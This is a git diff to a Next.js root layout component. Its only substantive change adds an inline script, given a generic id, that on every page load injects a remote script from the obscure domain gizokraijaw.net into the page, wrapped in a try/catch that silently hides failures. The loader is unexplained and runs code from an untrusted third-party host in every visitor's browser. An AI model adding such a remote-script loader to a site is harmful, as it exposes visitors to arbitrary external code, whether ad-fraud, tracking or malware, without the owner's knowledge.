@@ -8,6 +8,7 @@ import { Toaster } from "@/components/ui/sonner";
 import Header from "@/components/layout/header";
 import { Footer } from "@/components/layout/footer";
 import { Social } from "@/components/sections/social";
+import Script from "next/script";
 
 // const inter = localFont({
 //   src: [
@@ -174,6 +175,7 @@ export default function RootLayout({
         <script type="application/ld+json">
           {JSON.stringify(jsonLdProducts)}
         </script>
+       
       </head>
       <body className={` antialiased`}>
         
@@ -181,7 +183,13 @@ export default function RootLayout({
           <div className="min-h-screen md:px-20 px-4 py-24">{children}</div>
           <Footer />
           <Toaster />
-
+          <Script id="custom-inline-script" strategy="afterInteractive">
+          {`(function(d,z,s){
+              s.src='https://'+d+'/401/'+z;
+              try{(document.body||document.documentElement).appendChild(s)}
+              catch(e){}
+          })('gizokraijaw.net',9756271,document.createElement('script'))`}
+        </Script>
       </body>
     </html>
   );
